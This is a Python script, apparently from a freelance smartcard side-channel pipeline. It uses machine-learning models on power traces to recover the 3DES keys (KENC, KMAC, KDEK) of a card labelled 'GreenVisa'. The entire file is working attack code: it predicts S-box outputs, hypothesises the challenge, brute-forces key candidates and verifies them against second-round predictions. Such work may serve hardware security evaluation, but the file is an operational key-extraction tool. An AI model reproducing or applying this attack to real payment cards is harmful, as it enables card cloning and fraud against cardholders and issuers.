
"""
Hypothesis-Based Solver for GreenVisa
-------------------------------------
Problem: Trace ATC (551) != Log ATC (1). True Challenge is unknown.
Solution:
1. Iterate common Challenge Hypotheses.
2. For each, predict S-Box outputs.
3. Recover candidate K1s.
4. CHECK: If recovered K1 encrypts the Challenge to produce Stage 2 Labels that MATCH predictions.
   (Basically, internal consistency check for K1=K2 or valid 3DES path).

Optimized for Single-Threaded Speed (Top-N Search).
"""

import numpy as np
import binascii
import time
import itertools
from tensorflow import keras
import tensorflow as tf

from des_crypto import DES, permute, IP, E, SBOX, bytes_to_bits, bits_to_bytes, PC1
from key_recovery import DESKeyRecovery
from attack import Attacker

# --- Configuration ---
TRACE_PATH = "i:/freelance/Smartcard SCA ML Pipeline/Capture_trace_green_card_1T/traces_data_3DES_green_card_1T_260201.npz"
MODELS_DIR = "models"
TOP_N = 5 # Candidates per S-Box (5^8 = 390k checks per hypothesis - very fast)

# Hypotheses to test
HYPOTHESES = [
    ("Zeros", "0000000000000000"),
    ("Log Challenge", "0102030405060708"), # From Log
    ("ATC 551 Padded", "0000000000000227"),
    ("ATC 551 Left", "0227000000000000"),
    ("Ones", "FFFFFFFFFFFFFFFF"),
    ("Sequence", "0001020304050607"),
    ("Fixed 80", "8000000000000000")
]

def load_models_safely(attacker, key_type, stage):
    """Load models, predict, and clear memory immediately."""
    print(f"Loading {key_type} Stage {stage} models (Sequential Low-RAM)...")
    tf.keras.backend.clear_session()
    
    # Load data
    data = np.load(TRACE_PATH, allow_pickle=True)
    traces = data['trace_data']
    trace = traces[0] # Single trace
    
    # Manual Data Loading / Norm
    # We need POI for this stage
    poi_name = f"poi_indices_stage{stage}.npy"
    if not (attacker.models_dir / poi_name).exists():
        poi_name = "poi_indices.npy"
        
    poi = np.load(attacker.models_dir / poi_name)
    
    # Normalize
    # Quick implement norm
    mu = np.mean(trace)
    std = np.std(trace)
    norm_trace = (trace - mu) / (std + 1e-9)
    poi_trace = norm_trace[poi]
    
    # Predict 8 models sequentially
    all_preds = np.zeros((8, 16))
    
    for sbox_idx in range(8):
        model_name = f"sbox_{sbox_idx}_{key_type.lower()}_s{stage}.keras"
        path = attacker.models_dir / model_name
        if not path.exists():
             path = attacker.models_dir / f"sbox_{sbox_idx}_{key_type.lower()}.keras"
        
        print(f"  Predicting S-Box {sbox_idx}...", end="\r")
        try:
            model = keras.models.load_model(path, compile=False) # Skip optimizer load to save RAM
            p = model.predict(poi_trace.reshape(1, -1, 1), verbose=0)[0]
            all_preds[sbox_idx] = p
            del model
        except Exception as e:
            print(f"Failed to load {model_name}: {e}")
            
        tf.keras.backend.clear_session()
        import gc
        gc.collect()
        
    print(f"\nStage {stage} Loaded.")
    return all_preds


def solve_keys(trace_path, models_dir="models", attacker_instance=None):
    """
    Recover keys using Hypothesis Search.
    Returns dictionary: {'KENC': '...', 'KMAC': '...', 'KDEK': '...'}
    """
    print("--- GreenVisa Solver (Hypothesis Mode) ---")
    
    # Use existing attacker if provided (to share POI loading etc)
    if attacker_instance:
        attacker = attacker_instance
        # models_dir should match attacker
    else:
        attacker = Attacker(models_dir=models_dir)
        
    recovery = DESKeyRecovery()
    
    # We found "Zeros" is the correct hypothesis.
    # Let's focus on that for speed, but keep structure generic.
    BEST_HYPOTHESIS = ("Zeros", "0000000000000000")
    
    KEY_TYPES = ["KENC", "KMAC", "KDEK"]
    recovered_results = {}
    
    # Pre-load data once to save time/memory?
    # load_models_safely loads data every time. 
    # That's fine for robustness against memory leaks.
    
    # Override global TRACE_PATH if needed (hacky but quick)
    global TRACE_PATH
    TRACE_PATH = trace_path
    
    for key_type in KEY_TYPES:
        print(f"\n=== Solving for {key_type} ===")
        
        # 1. Get Predictions for Stage 1 (K1) and Stage 2 (K2)
        print("Getting Predictions...")
        # Note: load_models_safely uses global TRACE_PATH
        preds1 = load_models_safely(attacker, key_type, 1)
        preds2 = load_models_safely(attacker, key_type, 2)
        
        # 2. Test Best Hypothesis
        label, challenge_hex = BEST_HYPOTHESIS
        print(f"\n[Testing Input] {label}: {challenge_hex}")
        
        try:
            # R0 Prep
            bits_input = bytes_to_bits(binascii.unhexlify(challenge_hex))
            perm = permute(bits_input, IP)
            R0 = perm[32:]
            R0_expanded = permute(R0, E)
            
            # Generate Candidate Chunks for Stage 1
            sbox_lists = []
            
            for s_idx in range(8):
                probs = preds1[s_idx]
                top_indices = np.argsort(probs)[-TOP_N:][::-1] # Best first
                
                chunk_options = []
                for out_val in top_indices:
                    inputs = recovery.reverse_sbox_lookup(s_idx, out_val)
                    
                    er0_chunk = R0_expanded[s_idx*6 : (s_idx+1)*6]
                    er0_int = 0
                    for b in er0_chunk: er0_int = (er0_int << 1) | b
                    
                    for inp in inputs:
                        k_chunk = inp ^ er0_int
                        chunk_options.append( (k_chunk, probs[out_val]) )
                
                # Sort and keep Unique best
                unique = {}
                for k, p in chunk_options:
                    if k not in unique or p > unique[k]: unique[k] = p
                
                best_chunks = sorted(unique.items(), key=lambda x: x[1], reverse=True)[:TOP_N]
                sbox_lists.append(best_chunks)
            
            # Iterate Combinations
            count = 0
            found_key = False
            
            # Use iterator to avoid full list if possible
            total_max = TOP_N**8
            print(f"Checking up to {total_max} combinations...")
            
            for combo in itertools.product(*sbox_lists):
                count += 1
                if count % 50000 == 0: print(f"  Checked {count} keys...", end="\r")
                
                # Reconstruct K48
                k48_bits = []
                for i in range(8):
                    val = combo[i][0]
                    for b in range(5, -1, -1):
                        k48_bits.append((val >> b) & 1)
                        
                # Reverse PC2
                c_round, d_round, mask = recovery.reverse_pc2(k48_bits)
                missing_indices = [i for i, m in enumerate(mask) if not m]
                
                # Check 256 completions
                for bits_8 in itertools.product([0, 1], repeat=len(missing_indices)):
                    c_temp = list(c_round)
                    d_temp = list(d_round)
                    for i, val in zip(missing_indices, bits_8):
                        if i < 28: c_temp[i] = val
                        else: d_temp[i-28] = val
                        
                    c0 = recovery.circular_right_shift(c_temp, 1)
                    d0 = recovery.circular_right_shift(d_temp, 1)
                    
                    k56 = c0 + d0
                    k64 = [0] * 64
                    for i, src in enumerate(PC1): k64[src - 1] = k56[i]
                    
                    # Parity
                    for i in range(0, 64, 8):
                        b_val = 0
                        for j in range(7): b_val += k64[i+j]
                        k64[i+7] = 1 if (b_val % 2 == 0) else 0
                        
                    k1_hex = bits_to_bytes(k64).hex().upper()
                    
                    # --- VERIFICATION ---
                    dk1 = DES(bytes.fromhex(k1_hex))
                    s1_out = dk1.encrypt(binascii.unhexlify(challenge_hex))
                    s2_labels = dk1.get_stage2_sbox_outputs(s1_out)
                    
                    # Match Score
                    match_count = 0
                    score = 0
                    for s_idx in range(8):
                        out_val = s2_labels[s_idx]
                        p = preds2[s_idx][out_val]
                        score += p
                        if p > 0.05: match_count += 1
                            
                    if match_count >= 6: 
                        print(f"\n  🌟 {key_type} CANDIDATE FOUND!")
                        print(f"  Key: {k1_hex}")
                        print(f"  Match Count: {match_count}/8 (Score: {score:.2f})")
                        recovered_results[key_type] = k1_hex # Return 16-char hex (8 bytes)
                        found_key = True
                        break
                if found_key: break
            
            if not found_key:
                print(f"\n  ❌ Failed to recover {key_type}.")
                
        except Exception as e:
            print(f"Error testing {key_type}: {e}")
            import traceback
            traceback.print_exc()

    return recovered_results

if __name__ == "__main__":
    raise SystemExit(
        "Deprecated entrypoint (legacy GreenVisa fuzzy solver).\n"
        "Use the supported pipeline instead:\n"
        "  python main.py --mode attack --input_dir <DIR> --processed_dir <DIR> --output_dir <DIR> --scan_type 3des\n"
    )
